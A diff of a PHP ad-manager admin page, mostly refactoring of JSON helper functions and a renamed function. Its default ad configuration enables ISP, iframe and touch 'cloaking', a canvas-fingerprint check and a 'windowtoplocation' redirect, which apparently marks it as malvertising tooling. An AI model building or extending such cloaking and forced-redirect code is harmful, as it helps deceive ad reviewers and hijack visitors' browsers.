@@ -17,57 +17,36 @@
 	    return array_key_exists($key, $array) ? $array[$key] : $default;
 	}
 
-	function object_to_array($obj)
-	{
-	        $_arr = is_object($obj) ? get_object_vars($obj) : $obj;
-
-	        foreach ($_arr as $key => $val)
-	        {
-	            $val = (is_array($val) || is_object($val)) ? object_to_array($val) : $val;
-	            $arr[$key] = $val;
-	        }
-
-	        return $arr;
-	}	
-
 	function array_get_json_key_at_index_with_default($array, $key, $index, $default = null)
 	{
 		if (array_key_exists($key, $array))
 		{
-			$jsonDecoded = object_to_array(json_decode($array[$key]));
+			$jsonDecoded = json_decode($array[$key], true);
 			$jsonKeys = array_keys($jsonDecoded);
 
-			if ($index >= sizeof($jsonKeys))
+			if ($index < sizeof($jsonKeys))
 			{
-				return $default;
-			}
-
-			return $jsonKeys[$index];
+				return $jsonKeys[$index];
+			}			
 		}
-		else
-		{
-			return $default;
-		}		
+
+		return $default;
 	}
 
 	function array_get_json_value_at_index_with_default($array, $key, $index, $default = null)
 	{		
 		if (array_key_exists($key, $array))
 		{
-			$jsonDecoded = object_to_array(json_decode($array[$key]));
+			$jsonDecoded = json_decode($array[$key], true);
 			$jsonKeys = array_keys($jsonDecoded);
 
-			if ($index >= sizeof($jsonKeys))
+			if ($index < sizeof($jsonKeys))
 			{
-				return $default;
-			}
+				return implode("|", $jsonDecoded[$jsonKeys[$index]]);
+			}			
+		}
 
-			return implode("|", $jsonDecoded[$jsonKeys[$index]]);
-		}
-		else
-		{
-			return $default;
-		}
+		return $default;
 	}
 
 	function getAdTagCode($campaignID)
@@ -119,7 +98,7 @@
 		return $result;
 	}
 
-	function createorUpdateAd($campaignID, $cleanHtml, $configArray)
+	function createOrUpdateAd($campaignID, $cleanHtml, $configArray)
 	{
 		$cleanHtmlFilename = getCleanHtmlFilename($campaignID);
 		$configFilename  = getConfigFilename($campaignID);
@@ -181,13 +160,13 @@
 	else
 	{
 		$currentAd = array("campaignID" 	=> "", 
-				   		   "configArray" 	=> array("Method" => "windowtoplocation", 
-				   		   							 "TrackingPixelEnabled" => "true", 
-				   		   							 "OutputMethod" => "HTML", 
-				   		   							 "CanvasFingerprintCheckEnabled" => "false",
-				   		   							 "ISPCloakingEnabled" => "true",
-				   		   							 "IFrameCloakingEnabled" => "true",
-				   		   							 "TouchCloakingEnabled" => "true"),
+				   		   "configArray" 	=> array("Method" 							=> "windowtoplocation", 
+				   		   							 "TrackingPixelEnabled" 			=> "true", 
+				   		   							 "OutputMethod" 					=> "HTML", 
+				   		   							 "CanvasFingerprintCheckEnabled" 	=> "false",
+				   		   							 "ISPCloakingEnabled" 				=> "true",
+				   		   							 "IFrameCloakingEnabled" 			=> "true",
+				   		   							 "TouchCloakingEnabled" 			=> "true"),
 				   		   "cleanHtml" 		=> "<html>\n<head>\n\t{script}\n</head>\n<body{onload}>\n</body>\n</html>");
 	}
 
@@ -212,7 +191,10 @@
 
 					for ($i = 0; $i < sizeof($value); $i += 2)
 					{
-						$convertedValue[$value[$i]] = explode("|", $value[$i + 1]);
+						if (!empty($value[$i]))
+						{
+							$convertedValue[$value[$i]] = explode("|", $value[$i + 1]);
+						}
 					}
 
 					$configArray[$key] = json_encode($convertedValue);
@@ -226,7 +208,7 @@
 
 		//print_r_nice($configArray);
 
-		createorUpdateAd($_POST['campaignID'], $_POST['cleanHtml'], $configArray);
+		createOrUpdateAd($_POST['campaignID'], $_POST['cleanHtml'], $configArray);
 	}
 
 ?>
@@ -638,7 +620,6 @@
 					<th>Tag</th>
 					<th style="width: 50px;"></th>
 					<th style="width: 50px;"></th>
-					<th style="width: 50px;"></th>
 				</tr>
 			</thead>
 
@@ -663,7 +644,8 @@
 				{
 					echo "<td></td>\n";
 				}
-				echo "<td><a href=\"admanager.php?test=$campaignID\" alt=\"Test\" title=\"Test\"><span class=\"glyphicon glyphicon-play\" aria-hidden=\"true\"></span></a></td>\n";
+
+				//echo "<td><a href=\"admanager.php?test=$campaignID\" alt=\"Test\" title=\"Test\"><span class=\"glyphicon glyphicon-play\" aria-hidden=\"true\"></span></a></td>\n";
 				echo "<td><a href=\"admanager.php?delete=$campaignID\" alt=\"Delete\" title=\"Delete\" onclick=\"return confirm('Are you sure you want to delete ad with campaignID \'$campaignID\'?');\"><span class=\"glyphicon glyphicon-trash\" aria-hidden=\"true\"></span></a></td>\n";
 				echo "</tr>\n";
 			}
